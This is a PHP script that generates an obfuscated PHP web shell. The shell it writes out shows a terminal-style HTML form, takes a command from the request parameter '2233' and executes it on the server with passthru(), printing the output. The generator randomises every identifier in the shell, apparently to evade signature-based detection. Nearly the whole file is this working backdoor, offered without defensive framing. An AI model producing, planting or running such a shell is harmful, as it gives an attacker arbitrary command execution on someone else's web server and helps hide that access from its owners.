<?php


function make_random_name(){
	$name = rand() * rand();
	$name = hash("whirlpool", $name);
	$name = crypt($name);
	// shorten
	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
	// rm leading numbers
	$name = preg_replace('/^[0-9]+/', '', $name);
	// make sure the regex didn't leave us an empty string
	return ($name = NULL? make_random_name(): $name);
}

$functions = array();

for ($i=0; $i<=10; $i++){
	$functions[$i] = make_random_name();
}

echo '
<?php

$'.$functions[8].' = <<< EOF
<html>
	<head>
		<style>
			input{ background-color: rgb(255, 255, 255); width: 50%;}
			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
			body{ background-color: rgb(250, 250, 250);}
			'.$functions[3].'{ color: rgb(170, 170, 170);}
		</style>
	</head>
	<body>
		<form action="'.$functions[5].'" id="form" method="POST">
			<span>$ </span>
			<input type="text" name="2233" autocomplete="off" autofocus>
			<span> 2&gt;&amp;1 </span>
			<button type="submit">$$$</button>
		</form>
	<code>
<pre>
EOF;

function '.$functions[1].'($'.$functions[2].'){
	echo "<'.$functions[3].'>$ ".$'.$functions[2].'."</'.$functions[3].'><br>";
	echo passthru($'.$functions[2].'." 2>&1");
}
$'.$functions[4].'=$_REQUEST["2233"];
echo preg_replace('."'/".$functions[5]."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$functions[8].');

isset($'.$functions[4].')? '.$functions[1].'($'.$functions[4].') : $'.$functions[6].'=$'.$functions[7].'
;?>';

?>